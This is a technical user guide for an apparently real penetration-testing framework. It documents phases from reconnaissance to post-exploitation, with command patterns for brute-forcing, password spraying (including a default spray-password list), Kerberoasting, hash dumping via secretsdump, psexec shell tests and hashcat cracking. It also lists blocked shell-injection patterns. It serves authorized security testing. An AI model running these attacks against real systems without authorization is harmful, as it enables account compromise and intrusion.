# Perfodia Advanced Module User's Guide

**Version 1.1.0 | For Authorized Lab Use Only**

---

## Table of Contents

1. [Framework Architecture Overview](#1-framework-architecture-overview)
2. [Module-by-Module Deep Dive](#2-module-by-module-deep-dive)
3. [Utilities & Infrastructure Reference](#3-utilities--infrastructure-reference)
4. [Configuration Reference](#4-configuration-reference)
5. [Workflow Recipes](#5-workflow-recipes)
6. [Troubleshooting & Diagnostics](#6-troubleshooting--diagnostics)
7. [Extending the Framework](#7-extending-the-framework)

---

## 1. Framework Architecture Overview

### 1.1 Execution Flow

Perfodia orchestrates an 8-phase penetration testing workflow. Each phase is implemented as a Python module inheriting from `BaseModule`. The phases execute in dependency order, with each phase's output feeding the next:

```
┌─────────────┐    ┌──────────┐    ┌─────────────┐    ┌──────────┐
│   Recon     │───▶│ Scanning │───▶│ Enumeration │───▶│ Web App  │
│ (ReconModule│    │(Scanning │    │(Enumeration │    │(WebApp   │
│  recon.py)  │    │Module)   │    │Module)      │    │Module)   │
└─────────────┘    └──────────┘    └─────────────┘    └──────────┘
                        │                │                  │
                        ▼                ▼                  ▼
                   ┌──────────┐    ┌──────────┐    ┌──────────────┐
                   │Exploita- │───▶│ Active   │───▶│  Password    │
                   │tion      │    │Directory │    │  Cracking    │
                   │Module    │    │Module    │    │  Module      │
                   └──────────┘    └──────────┘    └──────────────┘
                        │                                  │
                        ▼                                  ▼
                   ┌───────────────────────────────────────────┐
                   │        Post-Exploitation Module           │
                   └───────────────────────────────────────────┘
```

### 1.2 Data Flow Between Phases

Each module's `run(previous_results)` method receives a dictionary containing all results from prior phases. The keys used are:

| Producing Phase | Dict Key | Data Structure | Consuming Phases |
|---|---|---|---|
| Scanning | `scan` → `hosts` | List of host dicts with `ip`, `hostname`, `ports[]` (each port has `port`, `state`, `service{}`, `scripts[]`), `os_matches[]` | Enumeration, WebApp, Exploitation, AD, Post-Exploitation |
| Enumeration | `enum` → `{ip}` | Per-host dict keyed by service type (`smb`, `snmp`, `http`, etc.) | WebApp (HTTP data) |
| Exploitation | `exploit` → `credentials` | List of dicts with `username`, `password`, `host`, `port`, `service` | AD, Post-Exploitation |
| Exploitation | `exploit` → `exploits_found` | List of dicts with `title`, `path`, `host`, `port`, `query` | Post-Exploitation |
| AD | `ad` → `domain` | String (e.g., `"lab.local"`) | Post-Exploitation |

### 1.3 Credential Vault Cross-Phase Integration

The `CredentialVault` (instantiated once, shared via `BaseModule.credential_vault`) provides the cross-phase credential sharing mechanism. Modules interact with it through convenience methods on `BaseModule`:

- **`_store_credential(**kwargs)`** → calls `self.credential_vault.add_password(...)` with `source_phase` defaulting to `self.MODULE_NAME`
- **`_store_hash(**kwargs)`** → calls `self.credential_vault.add_hash(...)` with `source_phase` defaulting to `self.MODULE_NAME`

The vault persists to `{session_dir}/loot/credential_vault.json` after every change. On session resume, the vault reloads automatically.

Credential types tracked (`CredType` enum):

| Enum Value | String | Description |
|---|---|---|
| `PASSWORD` | `"password"` | Cleartext password |
| `NTLM_HASH` | `"ntlm_hash"` | NTLM hash (LM:NT format) |
| `NET_NTLMV2` | `"net_ntlmv2"` | Net-NTLMv2 hash |
| `KERBEROS_TGT` | `"krb_tgt"` | Kerberos TGT |
| `KERBEROS_TGS` | `"krb_tgs"` | Kerberos TGS (Kerberoast) |
| `ASREP_HASH` | `"asrep_hash"` | AS-REP roastable hash |
| `SSH_KEY` | `"ssh_key"` | SSH private key |
| `TOKEN` | `"token"` | API/session token |
| `COOKIE` | `"cookie"` | Session cookie |

### 1.4 Scope Enforcement

`ScopeGuard` is injected into every `ToolRunner` instance. Before any subprocess execution, `ToolRunner.run()` calls `self.scope_guard.check_tool_args(tool_name, args)`, which:

1. Extracts all IPs from the argument list using a regex: `(?:^|[@/=\s])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:[:/\s]|$)`
2. Checks each extracted IP against allowed networks and denied networks
3. Denied networks take priority over allowed networks
4. If any IP is out of scope, returns a `ToolResult` with `error_category="scope_violation"` and `success=False`
5. Violations are recorded with timestamp, tool name, and action, saved to `{session_dir}/logs/scope_violations.json`

Additionally, during host discovery in `ScanningModule._host_discovery()`, each discovered host is checked via `self.scope_guard.check(ip, tool_name="nmap", action="host_discovery")` before being added to the live hosts list.

---

## 2. Module-by-Module Deep Dive

### 2.1 Reconnaissance Module (`modules/recon.py`)

**Class:** `ReconModule(BaseModule)` | **MODULE_NAME:** `"recon"`

#### Purpose & Scope

Performs passive and active information gathering for each target. Runs first in the pipeline with no dependencies on prior phases.

#### Method Reference

| Method | Parameters | Returns | Description |
|---|---|---|---|
| `run(previous_results=None)` | Dict (unused) | `Dict[str, Any]` | Orchestrates all recon sub-tasks per target |
| `_dns_enum(target: str)` | Target IP/hostname | `Dict` with `records`, `raw`, `dnsrecon` keys | Queries 8 DNS record types (A, AAAA, MX, NS, TXT, SOA, CNAME, SRV) via `dig`, full `ANY` query, and `dnsrecon -d {target} -t std` |
| `_whois_lookup(target: str)` | Target | `Dict` with `raw` and extracted fields: `registrar`, `creation_date`, `expiry_date`, `name_servers`, `org`, `netrange`, `cidr` | Runs `whois {target}` and extracts fields via regex |
| `_reverse_dns(target: str)` | Target IP | `Dict` with `ptr_records` list | Runs `dig -x {target} +short` |
| `_web_fingerprint(target: str)` | Target | `Dict` keyed by `http`/`https` | Runs `whatweb {scheme}://{target} --color=never -a 3 --log-json {path}` for both HTTP and HTTPS |
| `_zone_transfer(target: str)` | Target | `Dict` with `attempted`, `vulnerable`, `nameservers_tested`, `transfer_{ns}` | First gets NS records, then attempts `dig @{ns} {target} AXFR` against each; marks vulnerable if "XFR size" appears in output |

#### Tool Integrations

| Tool | Command Pattern | Output Parsed |
|---|---|---|
| `dig` | `dig {target} {rtype} +short +time=5 +tries=2` | Raw stdout, line-split for records |
| `whois` | `whois {target}` | Regex extraction of key fields |
| `dnsrecon` | `dnsrecon -d {target} -t std` | Raw stdout stored |
| `whatweb` | `whatweb {scheme}://{target} --color=never -a 3 --log-json {path}` | Raw stdout |

#### Configuration Parameters

No module-specific config keys. Uses `general.timeout` (default: 300s) and `general.max_retries` (default: 2).

#### Input Dependencies

None — first phase in the pipeline.

#### Output Artifacts

- Files: `recon/dns_{target}_{rtype}.txt`, `recon/dns_{target}_full.txt`, `recon/dnsrecon_{target}.txt`, `recon/whois_{target}.txt`, `recon/whatweb_{target}_{scheme}.json`, `recon/zone_transfer_{target}_{ns}.txt`
- Return dict keyed by target with `dns`, `whois`, `reverse_dns`, `web_fingerprint`, `zone_transfer` sub-keys

#### Common Failure Modes

- `dig` not installed → `ToolResult` with `error_category="not_found"`; install `dnsutils`
- DNS timeouts on external targets → `dig` uses `+time=5 +tries=2`; increase if needed
- `whatweb` missing → web fingerprinting silently skipped (checked via `is_tool_available`)

---

### 2.2 Scanning Module (`modules/scanning.py`)

**Class:** `ScanningModule(BaseModule)` | **MODULE_NAME:** `"scan"`

#### Purpose & Scope

Discovers live hosts, performs port scanning, service detection, OS fingerprinting, and vulnerability scanning using nmap NSE scripts. This is the foundational phase — all subsequent phases depend on its `hosts` output.

#### Method Reference

| Method | Signature | Description |
|---|---|---|
| `run(previous_results)` | `Dict → Dict` | Orchestrates: host discovery → quick port scan → detailed scan → vuln scan |
| `_host_discovery(target)` | `str → List[str]` | Nmap ping sweep with `-sn -PE -PP -PS80,443,22,445 -PA80,443 --min-rate 300`. Parses "Nmap scan report for" lines. Applies scope guard and exclusion checks. |
| `_masscan_sweep(target)` | `str → Optional[Dict[str, List[int]]]` | Used when masscan is available and target contains `/` (CIDR). Rate from `masscan.rate` config (default: 1000). Ports from `masscan.ports` (default: `"1-65535"`). Returns `{ip: [ports]}` or `None`. |
| `_detailed_scan(host_ip, quick_ports)` | `str, Optional[Dict] → Optional[Dict]` | Full nmap scan. Supports three modes: **Normal** (default flags `-sS -sV -sC -O -T{timing}`), **Extra** (appends user flags), **Raw** (replaces all defaults). Parses XML output via `parse_nmap_xml()`. |
| `_vuln_scan(host_ip, ports)` | `str, List[str] → Optional[Dict]` | Runs `nmap -sV --script {scripts} -p {ports} --host-timeout 10m`. Script selection: user `--nmap-scripts` → config `nmap.scripts` → default `["vuln", "safe"]`. Caps ports at 100. |
| `_merge_vuln_results(host_data, vuln_data)` | `Dict, Dict → None` | Merges vuln script results into host data by port number, deduplicating by script `id`. |

#### Nmap User Override System

The scanning module supports three override modes configured via `nmap_user_opts` in config:

1. **`nmap_user_opts.raw`** (list): Replaces ALL default nmap flags. Only `-oX`, `-oN`, port args, and target IP are appended.
2. **`nmap_user_opts.extra`** (list): Appended after all default flags.
3. **`nmap_user_opts.scan_type`** (string): Replaces the scan type flag (e.g., `-sS` → `-sT`). When `-sT` is used, `-O` (OS detection) is automatically excluded since it requires root.

#### Configuration Parameters

| Key | Default | Valid Range | Effect |
|---|---|---|---|
| `nmap.default_ports` | `"1-65535"` | Any nmap port spec | Ports to scan when no masscan pre-scan |
| `nmap.timing_template` | `4` | `0-5` | Nmap `-T` value (0=paranoid, 5=insane) |
| `nmap.max_retries` | `2` | `0-10` | Nmap `--max-retries` |
| `nmap.host_timeout` | `"5m"` | Nmap time format | Per-host timeout |
| `nmap.scripts` | `["default", "vuln", "safe"]` | Nmap script names | NSE scripts for vuln scan |
| `nmap.extra_args` | `[]` | List of strings | Additional nmap flags from config file |
| `masscan.rate` | `1000` | `1-100000` | Packets per second |
| `masscan.ports` | `"1-65535"` | Port range string | Masscan port range |

#### Output Artifacts

- Files: `nmap/discovery_{target}.gnmap`, `nmap/scan_{host_ip}.xml`, `nmap/scan_{host_ip}.nmap`, `nmap/vuln_{host_ip}.xml`, `nmap/masscan_{target}.gnmap`
- Return dict: `{"status", "hosts": [{ip, hostname, ports[], os_matches[], scripts[]}], "total_hosts", "total_open_ports"}`

#### Common Failure Modes

- **"requires root"**: Exit code 1 with stderr containing "requires root". Hint logged: use `sudo` or `--nmap-scan-type sT`.
- **Nmap XML parse failure**: Logged as error; host returns `None`.
- **Masscan failure**: Falls back to full nmap scan (`return None`).
- **No live hosts**: Warning logged; target skipped.

---

### 2.3 Enumeration Module (`modules/enumeration.py`)

**Class:** `EnumerationModule(BaseModule)` | **MODULE_NAME:** `"enum"`

#### Purpose & Scope

Performs deep service-specific enumeration on all open ports discovered during scanning. Maps service names to enumeration handlers via `SERVICE_ENUM_MAP`.

#### Service-to-Handler Mapping

| Service Name(s) | Handler | Tools Used |
|---|---|---|
| `microsoft-ds`, `netbios-ssn`, `smb` | `_enum_smb` | enum4linux-ng, smbclient, nbtscan, rpcclient |
| `snmp` | `_enum_snmp` | onesixtyone, snmpwalk |
| `http`, `https`, `http-proxy` | `_enum_http` | curl, nikto, gobuster |
| `ftp` | `_enum_ftp` | curl (anonymous login test) |
| `ssh` | `_enum_ssh` | Banner extraction from scan data |
| `smtp` | `_enum_smtp` | nmap NSE (smtp-enum-users, smtp-commands, smtp-open-relay) |
| `dns`, `domain` | `_enum_dns` | dig (recursion check) |
| `ldap` | `_enum_ldap` | nmap NSE (ldap-rootdse, ldap-search) |
| `mysql` | `_enum_mysql` | nmap NSE (mysql-info, mysql-enum, mysql-empty-password) |
| `ms-sql-s` | `_enum_mssql` | nmap NSE (ms-sql-info, ms-sql-ntlm-info, ms-sql-empty-password) |
| `postgresql` | `_enum_postgres` | nmap NSE (pgsql-brute) |
| `rdp`, `ms-wbt-server` | `_enum_rdp` | nmap NSE (rdp-enum-encryption, rdp-ntlm-info) |

#### Key Method Details

**`_enum_smb(ip, port_list)`**: Runs enum4linux-ng with `-A` (all enumeration) and `-oJ` for JSON output. Falls back to smbclient null session (`-L //{ip} -N --no-pass`), nbtscan, and rpcclient commands (`enumdomusers`, `enumdomgroups`, `getdompwinfo`). Output parsed via `parse_enum4linux_output()`.

**`_enum_snmp(ip, port_list)`**: Community string brute-force via onesixtyone using strings from `enumeration.snmp.community_strings` (default: `["public", "private", "community"]`). Then snmpwalk with 6 OID branches: system (`1.3.6.1.2.1.1`), interfaces (`1.3.6.1.2.1.2`), running processes (`1.3.6.1.2.1.25.4.2.1.2`), installed software (`1.3.6.1.2.1.25.6.3.1.2`), TCP connections (`1.3.6.1.2.1.6.13.1.3`), users (`1.3.6.1.4.1.77.1.2.25`). Also attempts SNMPv3 enumeration (`_enum_snmpv3`) at three security levels: noAuthNoPriv, authNoPriv, authPriv.

**`_enum_snmpv3(ip, v3_config)`**: Tests noAuthNoPriv with usernames from `enumeration.snmpv3.usernames` (default: `["initial", "public", "admin", "snmpuser"]`). Then tests authNoPriv with credentials from `enumeration.snmpv3.credentials`. Successful access is scored as a finding via `_score_finding()` with `Severity.MEDIUM` (CVSS 5.3). Valid credentials are stored in the vault.

**`_enum_http(ip, port_list)`**: Determines scheme from `service.tunnel` field ("ssl" → HTTPS) or port (443 → HTTPS). Runs curl for headers, nikto with tuning `123457890abc`, and gobuster with wordlist from `enumeration.http.wordlist` (default: `/usr/share/wordlists/dirb/common.txt`) and extensions from `enumeration.http.extensions` (default: `"php,html,txt,asp,aspx,jsp"`).

**`_enum_ftp(ip, port_list)`**: Tests anonymous FTP via `curl ftp://anonymous:anonymous@{ip}:{port}/`. Scores anonymous access as `Severity.MEDIUM` (CVSS 5.3).

#### Configuration Parameters

| Key | Default | Effect |
|---|---|---|
| `enumeration.smb.enabled` | `true` | Enable/disable SMB enumeration |
| `enumeration.smb.depth` | `"full"` | `"basic"` or `"full"` |
| `enumeration.snmp.community_strings` | `["public", "private", "community"]` | SNMP community strings to test |
| `enumeration.snmpv3.enabled` | `true` | Enable SNMPv3 enumeration |
| `enumeration.snmpv3.usernames` | `["initial", "public", "admin", "snmpuser"]` | SNMPv3 noAuthNoPriv usernames |
| `enumeration.snmpv3.credentials` | See default.yaml | SNMPv3 authNoPriv credential list |
| `enumeration.http.wordlist` | `/usr/share/wordlists/dirb/common.txt` | Gobuster wordlist |
| `enumeration.http.extensions` | `"php,html,txt,asp,aspx,jsp"` | Gobuster file extensions |

#### Input Dependencies

Requires `previous_results["scan"]["hosts"]` — the list of host dicts from the scanning phase. Skips with `status: "skipped"` if empty.

---

### 2.4 Web Application Testing Module (`modules/web_app.py`)

**Class:** `WebAppModule(BaseModule)` | **MODULE_NAME:** `"webapp"`

#### Purpose & Scope

Deep web application testing beyond basic enumeration. Discovers all HTTP/HTTPS targets from scan data and performs directory brute-forcing, header analysis, technology detection, SQL injection testing, common vulnerability checks, and parameter discovery.

#### Method Reference

| Method | Description |
|---|---|
| `run(previous_results)` | Orchestrator: finds web targets → ffuf/wfuzz → headers → tech detection → sqlmap → vuln checks → param discovery |
| `_find_web_targets(hosts)` | Extracts HTTP/HTTPS targets from scan results. Matches service names `{http, https, http-proxy, https-alt, http-alt}` and common ports `{80, 443, 8080, 8443, 8000, 8888}`. |
| `_ffuf_scan(url, ip, port)` | Runs `ffuf -u {url}/FUZZ -w {wordlist} -e .{extensions} -mc 200,201,204,301,302,307,401,403,405 -fc 404 -t 40 -timeout 10 -o {path} -of json -s`. Parses JSON output into `directories` and `files` lists. |
| `_wfuzz_scan(url, ip, port)` | Fallback: `wfuzz -c --hc 404 -t 40 -w {wordlist} {url}/FUZZ` |
| `_analyze_headers(url)` | Checks for 7 missing security headers: `strict-transport-security`, `x-content-type-options`, `x-frame-options`, `content-security-policy`, `x-xss-protection`, `referrer-policy`, `permissions-policy`. Detects server version disclosure and `X-Powered-By` leakage. |
| `_detect_technologies(url)` | Probes 10 framework-specific paths (e.g., `/wp-login.php` → WordPress, `/.env` → Laravel/Node.js, `/server-status` → Apache mod_status). Returns list of detected frameworks. |
| `_sqlmap_scan(url, ip, port)` | Runs `sqlmap -u {url} --crawl=2 --batch --random-agent --level=1 --risk=1 --threads=3 --timeout=15 --retries=1 --forms --smart`. Parses for "is vulnerable" or "sqlmap identified" in output. Extracts injection points via regex. |
| `_check_common_vulns(url)` | Checks: `robots.txt` (disallow present), `.git/HEAD` (200 response), `.env` (200 response), backup files (`{index,config,database,backup,site,web}.{bak,old,backup,sql,tar.gz,zip}`). |
| `_discover_parameters(url)` | Extracts `<input>` `name` attributes and URL query parameter names from page source via regex. |

#### Configuration Parameters

| Key | Default | Effect |
|---|---|---|
| `webapp.enabled` | `true` | Enable/disable web app testing |
| `webapp.wordlist` | `/usr/share/wordlists/dirb/common.txt` | Wordlist for ffuf/wfuzz |
| `webapp.extensions` | `"php,html,txt,bak,old,conf,asp,aspx,jsp,json,xml"` | File extensions for brute-forcing |
| `webapp.sqlmap_enabled` | `true` | Enable SQL injection testing |
| `webapp.sqlmap_level` | `1` | Sqlmap aggressiveness (1-5) |
| `webapp.sqlmap_risk` | `1` | Sqlmap risk (1-3) |
| `webapp.check_backup_files` | `true` | Probe for backup files |
| `webapp.check_git_exposure` | `true` | Check for .git directory |
| `webapp.check_env_exposure` | `true` | Check for .env file |

---

### 2.5 Exploitation Module (`modules/exploitation.py`)

**Class:** `ExploitationModule(BaseModule)` | **MODULE_NAME:** `"exploit"`

#### Purpose & Scope

Cross-references discovered services with ExploitDB, runs credential attacks via hydra, tests SMB with CrackMapExec, and generates Metasploit resource scripts.

#### Method Reference

| Method | Description |
|---|---|
| `run(previous_results)` | Phase 1: searchsploit cross-ref per service. Phase 2: hydra attacks (only if `safe_mode=False`). Phase 3: CrackMapExec SMB null session. Phase 4: generate MSF RC script. |
| `_searchsploit(query)` | Runs `searchsploit --json --disable-colour {query}`. Parsed via `parse_searchsploit_json()`. |
| `_hydra_attack(ip, port, service)` | Builds: `hydra -L {user_file} -P {passwords_file} -s {port} -t 4 -f -o {output} [-W {spray_delay}] {service}://{ip}`. Parses output via `parse_hydra_output()`. |
| `_crackmapexec_smb(hosts)` | Resolves binary via `resolve_tool_binary("crackmapexec")` (supports aliases: crackmapexec, netexec, nxc). Runs null session test: `{binary} smb {ip} -u "" -p ""`. |
| `_generate_msf_script(exploits, hosts)` | Creates `{session_dir}/exploits/autopwn.rc` with workspace setup, `db_import` for nmap XMLs, and search suggestions for top 20 exploits. |

#### Safe Mode Behavior

When `exploitation.safe_mode` is `true` (default), **all credential attacks (hydra, password spraying) are skipped**. Only searchsploit cross-referencing and MSF script generation run. This is the primary safety mechanism.

#### Configuration Parameters

| Key | Default | Effect |
|---|---|---|
| `exploitation.safe_mode` | `true` | Skip destructive attacks |
| `exploitation.auto_exploit` | `false` | (Reserved for future use) |
| `exploitation.max_exploit_threads` | `3` | Max concurrent exploit threads |
| `credentials.usernames` | `["admin", "root", "administrator", "user", "test"]` | Default username list for hydra |
| `credentials.passwords_file` | `/usr/share/wordlists/quick_passwords.txt` | Password wordlist path |
| `credentials.spray_lockout_threshold` | `3` | Max attempts per account |
| `credentials.spray_delay` | `30` | Seconds between spray rounds |

#### Hydra-Supported Services

Defined in `HYDRA_SERVICES` dict: `ssh` (22), `ftp` (21), `smb` (445), `rdp` (3389), `mysql` (3306), `mssql` (1433), `postgresql` (5432), `telnet` (23), `vnc` (5900), `smtp` (25), `pop3` (110), `imap` (143).

---

### 2.6 Active Directory Module (`modules/active_directory.py`)

**Class:** `ActiveDirectoryModule(BaseModule)` | **MODULE_NAME:** `"ad"`

#### Purpose & Scope

Dedicated AD assessment: DC identification, LDAP enumeration, BloodHound collection, AS-REP roasting, Kerberoasting, password spraying, domain trust mapping, GPO enumeration, and SMB signing checks.

#### Method Reference

| Method | Description |
|---|---|
| `_find_domain_controllers(hosts)` | Heuristic: host must have ports 389 (LDAP) AND 88 (Kerberos) open. Scored by overlap with DC port set `{53, 88, 135, 139, 389, 445, 464, 636, 3268, 3269}`. Sorted by descending score. |
| `_detect_domain(dcs, hosts)` | Queries LDAP rootDSE for `defaultNamingContext`, converts `DC=lab,DC=local` → `lab.local`. Falls back to hostname splitting. |
| `_ldap_enumerate(dc_ip, domain, credentials)` | Anonymous bind attempt first, then authenticated with each credential. Extracts `sAMAccountName`, `adminCount`, `servicePrincipalName`, `memberOf`. Caps at 500 users (anonymous) or 1000 (authenticated). |
| `_asrep_roast(dc_ip, domain, ldap_data)` | `impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -format hashcat -outputfile {path} [-usersfile {file}]`. Stores hashes in vault as `CredType.ASREP_HASH`. |
| `_kerberoast(dc_ip, domain, credentials)` | `impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request -outputfile {path}`. |
| `_bloodhound_collect(dc_ip, domain, credentials)` | `bloodhound-python -c All -u {user} -p {pass} -d {domain} -dc {dc_ip} -ns {dc_ip} --zip --output-prefix {path}`. |
| `_password_spray(dc_ip, domain, users)` | Uses crackmapexec/nxc: `{binary} smb {dc_ip} -u {user_file} -p {pwd} -d {domain} --continue-on-success`. Iterates passwords from `ad.spray_passwords` (max `spray_lockout_threshold` rounds). Delays `spray_delay` seconds between rounds. Only runs when `safe_mode=False`. |
| `_enumerate_trusts(dc_ip, domain, credentials)` | Runs `nmap --script ldap-rootdse -p 389 {dc_ip}`. |
| `_enumerate_gpo(dc_ip, domain, credentials)` | LDAP search on `CN=Policies,CN=System,{base_dn}` for `groupPolicyContainer` objects, extracting `displayName` and `gPCFileSysPath`. |
| `_check_smb_signing(dc_ip)` | `nmap --script smb2-security-mode -p 445 {dc_ip}`. Checks for "not required" or "signing disabled" in output. |

#### Configuration Parameters

| Key | Default | Effect |
|---|---|---|
| `ad.enabled` | `true` | Enable AD assessment |
| `ad.bloodhound_collect` | `true` | Enable BloodHound data collection |
| `ad.spray_passwords` | `["Password1", "Welcome1", "Company123", "Spring2025", "Summer2025", "Changeme1"]` | Passwords for spraying |
| `ad.max_spray_users` | `200` | Cap users per spray round |
| `ad.check_smb_signing` | `true` | Check SMB signing enforcement |

---

### 2.7 Password Cracking Module (`modules/cracking.py`)

**Class:** `CrackingModule(BaseModule)` | **MODULE_NAME:** `"crack"`

#### Purpose & Scope

Collects hashes from the credential vault and loot files, runs hashcat or john the ripper, and stores cracked passwords back into the vault.

#### Hash Collection

`_collect_hashes()` gathers from two sources:

1. **Credential vault**: `self.credential_vault.get_hashes()` returns all `NTLM_HASH`, `NET_NTLMV2`, `ASREP_HASH`, `KERBEROS_TGS` entries. Types are mapped via `_CREDTYPE_TO_HASHCAT`: `ntlm_hash→ntlm`, `net_ntlmv2→ntlmv2`, `asrep_hash→asrep`, `krb_tgs→kerberoast`.

2. **Loot directory files**: Matches patterns `asrep_hashes_*.txt` (→asrep), `kerberoast_*.txt` (→kerberoast), `secretsdump_*.ntds` (→ntlm).

#### Hashcat Mode Mapping (`HASHCAT_MODES`)

| Type | Mode | Description |
|---|---|---|
| `ntlm` | 1000 | NTLM |
| `ntlmv2` / `net-ntlmv2` | 5600 | Net-NTLMv2 |
| `asrep` | 18200 | AS-REP |
| `kerberoast` / `krb5tgs` | 13100 | Kerberos TGS |
| `md5` | 0 | MD5 |
| `sha256` | 1400 | SHA-256 |
| `sha512` | 1800 | SHA-512 |
| `bcrypt` | 3200 | bcrypt |
| `mscache2` | 2100 | MS Cache v2 |
| `lm` | 3000 | LM |

#### John Format Mapping

| Type | John Format |
|---|---|
| `ntlm` | `NT` |
| `ntlmv2` | `netntlmv2` |
| `asrep` | `krb5asrep` |
| `kerberoast` | `krb5tgs` |

#### Configuration Parameters

| Key | Default | Effect |
|---|---|---|
| `cracking.enabled` | `true` | Enable cracking phase |
| `cracking.wordlist` | `/usr/share/wordlists/rockyou.txt` | Wordlist path |
| `cracking.max_runtime` | `600` | Max seconds per hash type |
| `cracking.use_rules` | `true` | Use hashcat `best64.rule` if available at `/usr/share/hashcat/rules/best64.rule` |

#### Hashcat Command

```
hashcat -m {mode} {hash_file} {wordlist} --potfile-path {pot} --outfile {out}
  --outfile-format 2 --runtime {max_runtime} --quiet --force
  [-r /usr/share/hashcat/rules/best64.rule]
```

#### Post-Cracking

`_store_cracked()` extracts usernames from hashes via `_extract_username_from_hash()` which handles NTLM secretsdump format (`user:rid:lmhash:nthash`), Kerberos formats (`$krb5asrep$23$user@DOMAIN`, `$krb5tgs$23$*user$DOMAIN`), and Net-NTLMv2 format (`user::domain:...`).

---

### 2.8 Post-Exploitation Module (`modules/post_exploitation.py`)

**Class:** `PostExploitationModule(BaseModule)` | **MODULE_NAME:** `"post"`

#### Purpose & Scope

Validates obtained credentials via Impacket tools, generates privilege escalation enumeration scripts, creates a lateral movement guide, and runs additional Kerberos attacks.

#### Method Reference

| Method | Description |
|---|---|
| `_impacket_operations(credentials, hosts)` | For each credential: runs `impacket-secretsdump {user}:{pass}@{host}` (hash extraction) and `impacket-psexec {user}:{pass}@{host} whoami` (shell test). Only for SMB/microsoft-ds services. |
| `_kerberos_attacks(smb_hosts, credentials, domain)` | AS-REP roasting and Kerberoasting against all SMB hosts using Impacket. Looks for existing user lists from AD/spray phases. |
| `_generate_privesc_scripts(hosts)` | Writes `linux_privesc_enum.sh` and `windows_privesc_enum.bat` to `{session_dir}/loot/`. Linux script checks: SUID binaries, world-writable files, cron jobs, capabilities, SSH keys. Windows script checks: services, scheduled tasks, AlwaysInstallElevated, stored credentials. |
| `_lateral_movement_guide(hosts, credentials)` | Generates per-host lateral movement options based on open ports: 445/139→PSExec/Pass-the-Hash, 5985/5986→Evil-WinRM, 22→SSH, 3389→RDP. Saves to `{session_dir}/loot/lateral_movement_guide.txt`. |

---

## 3. Utilities & Infrastructure Reference

### 3.1 ToolRunner (`utils/tool_runner.py`)

**Class:** `ToolRunner`

The central subprocess execution engine. Every external tool call flows through `ToolRunner.run()`.

#### Execution Pipeline

1. **Sanitize arguments**: `sanitize_args(args, tool_name=tool_name)` — removes shell injection characters
2. **Scope check**: `self.scope_guard.check_tool_args(tool_name, args)` — validates all IPs in args
3. **Resolve binary**: Checks config overrides → `shutil.which()` → alternate paths (`/usr/bin/`, `/usr/local/bin/`, `/usr/share/`, `/opt/`)
4. **Dry run check**: If `self.dry_run`, logs command and returns success
5. **Execute with retries**: Up to `retries` attempts with `retry_delay` between. Does NOT retry `usage`, `permission`, or `not_found` errors.
6. **Save output**: Writes stdout to `{session_dir}/{output_file}`, stderr to `{output_file}.stderr`
7. **Parse output**: If `parse_func` provided, calls it on stdout

#### ToolResult Dataclass

| Field | Type | Description |
|---|---|---|
| `tool` | `str` | Tool name |
| `command` | `List[str]` | Full command line |
| `return_code` | `int` | Process exit code (-1 for framework errors) |
| `stdout` | `str` | Standard output |
| `stderr` | `str` | Standard error |
| `duration` | `float` | Execution time in seconds |
| `success` | `bool` | `True` if return_code == 0 |
| `output_files` | `List[str]` | Paths to saved output files |
| `parsed_data` | `Any` | Result of parse_func if provided |
| `error_message` | `Optional[str]` | Human-readable error description |
| `error_category` | `Optional[str]` | One of: `timeout`, `permission`, `not_found`, `usage`, `runtime`, `os_error`, `scope_violation` |

#### Error Categories

| Category | Trigger | Retried? |
|---|---|---|
| `timeout` | `subprocess.TimeoutExpired` | Yes |
| `permission` | stderr contains "permission denied" or "requires root" | No |
| `not_found` | `FileNotFoundError` | No |
| `usage` | Exit code 1-2 + stderr contains "usage" or "help" | No |
| `runtime` | Non-zero exit code (other) | Yes |
| `os_error` | `OSError` (disk full, missing lib) | Yes |
| `scope_violation` | ScopeGuard check failed | No |

### 3.2 ScopeGuard (`utils/scope_guard.py`)

**Class:** `ScopeGuard`

Thread-safe scope enforcement. Constructor takes `targets` (allow-list), `exclusions` (deny-list), and `strict` (default `True` — reject unresolvable hostnames).

#### Key Methods

- `check(target, tool_name="", action="") → bool`: Checks IP or hostname. Deny-list takes priority. Hostnames are resolved via `socket.gethostbyname()`.
- `check_tool_args(tool_name, args) → bool`: Extracts IPs from args and checks each.
- `extract_ips_from_args(args) → List[str]`: Regex-based IP extraction from tool arguments.
- `save_violations(session_dir)`: Writes violations to JSON.

### 3.3 Sanitizer (`utils/sanitizer.py`)

Removes dangerous characters from tool arguments: `;&|`$(){}!\<>\n\r\x00`. Detects injection patterns like `; command`, `| command`, `$(command)`, `` `command` ``.

#### Functions

- `sanitize_arg(arg, tool_name="") → str`: Sanitize single argument
- `sanitize_args(args, tool_name="") → List[str]`: Sanitize list, drops empty results
- `is_safe_path(path) → bool`: Blocks `..` traversal and shell chars
- `sanitize_hostname(hostname) → str`: Only allows `[a-zA-Z0-9.\-:]`

### 3.4 ParallelRunner (`utils/parallel.py`)

**Class:** `ParallelRunner`

Thread-pool-based parallel execution with per-host error isolation.

- Constructor: `max_workers` clamped to `[1, 50]`
- `run_per_host(hosts, func, description, timeout_per_host) → ParallelResult`: Runs `func(host_ip)` for each host. Single host → sequential fast path. Logs progress as percentage.
- `ParallelResult`: `total`, `succeeded`, `failed`, `results: Dict[str, Any]`, `errors: Dict[str, str]`, `duration: float`

### 3.5 CredentialVault (`utils/credential_vault.py`)

**Class:** `CredentialVault`

Thread-safe credential store with deduplication, auto-persistence, and reuse suggestions.

#### Key Methods

| Method | Description |
|---|---|
| `add(cred: Credential) → bool` | Add credential; returns `True` if new. Deduplicates by `identity` (SHA-256 of `{domain}\{username}:{cred_type}:{secret_hash[:16]}`). Merges verification status on duplicate. |
| `add_password(username, password, ...) → bool` | Convenience for cleartext passwords |
| `add_hash(username, hash_value, hash_type, ...) → bool` | Convenience for hashes |
| `mark_verified(username, secret, host, admin=False)` | Mark credential as working on a host |
| `get_for_host(host, service="", verified_only=False) → List[Credential]` | Returns creds found on host, verified on host, or domain creds (usable across hosts) |
| `get_hashes() → List[Credential]` | Returns NTLM_HASH, NET_NTLMV2, ASREP_HASH, KERBEROS_TGS types |
| `get_admin_creds() → List[Credential]` | Creds with `admin_access=True` |
| `stats() → Dict` | Returns counts: total, passwords, hashes, kerberos, ssh_keys, verified, admin_access, unique_users, unique_hosts |
| `to_report_data() → List[Dict]` | Export with masked secrets (first 2 + last char for passwords, first 6 + last 4 for hashes) |

